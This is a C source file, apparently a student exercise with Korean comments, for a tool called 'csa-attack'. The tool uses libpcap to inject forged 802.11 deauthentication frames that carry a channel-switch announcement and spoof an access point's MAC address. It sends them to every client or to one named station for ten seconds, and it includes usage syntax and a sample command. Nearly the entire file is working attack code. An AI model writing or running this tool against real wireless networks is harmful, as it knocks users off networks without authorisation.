#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>  // 시그널 관련 헤더 추가

#include "frame.h"


void usage();
void AP_broadcast_frame(struct Packet *packet);
void AP_unicast_frame(struct Packet *packet, char *station_mac);
void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);
void handleSignal(int signal);
void cleanup(pcap_t *handle);

pcap_t *global_handle;  // 전역으로 pcap 핸들 선언


// syntax : csa-attack <interface> <ap mac> [<station mac>]
// sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];

    struct Packet packet;

    initPacket(&packet, argv[2]);
    
    initPacket(&packet, argv[2]);
    if (argc == 3) {
        AP_broadcast_frame(&packet);
        printf("AP_Broadcast Mode\n");
    } else if (argc == 4) {
        AP_unicast_frame(&packet, argv[3]);
        printf("AP_unicast_frame Mode\n");
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, 0, 0, 0, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

    // 전역 변수에 pcap 핸들 할당
    global_handle = handle;

    // 시그널 핸들러 등록
    signal(SIGINT, handleSignal);

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 10) {

        if (pcap_sendpacket(handle, (unsigned char *)&packet, sizeof(packet)) != 0) {
                printf("Deauth_frame send fail\n");
                cleanup(handle);
                exit(-1);
        }
        

        sleep(1); // or usleep(10000); ?
    }

    cleanup(handle);
    return 0;
}

void usage() {
    printf("Syntax is incorrect.\n");
    printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void initPacket(struct Packet *packet, char *ap_mac) {
    memset(packet, 0, sizeof(struct Packet));
    packet->radiotap.it_len = 0x0018;
    packet->deauth.type = 0xc0;
    macStringToUint8(ap_mac, packet->deauth.source_address);
    macStringToUint8(ap_mac, packet->deauth.bssid);


    uint8_t channel_num[5] = {0x12,0x34,0x14,0x45,0x31};
    memcpy(packet->channel_switch_announcement,channel_num,sizeof(channel_num));
}

void AP_broadcast_frame(struct Packet *packet) {
    memset(packet->deauth.destination_address, 0xFF, 6);
}

// AP가 특정 Station에게 연결을 끊으라고 할 때
void AP_unicast_frame(struct Packet *packet, char *station_mac) {
    macStringToUint8(station_mac, packet->deauth.destination_address);
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}

void handleSignal(int signal) {
    printf("Entered Ctrl+C, exit program\n");
    cleanup(global_handle);
    exit(0);
}

void cleanup(pcap_t *handle) {
    printf("pcap close!\n");
    pcap_close(handle);
}
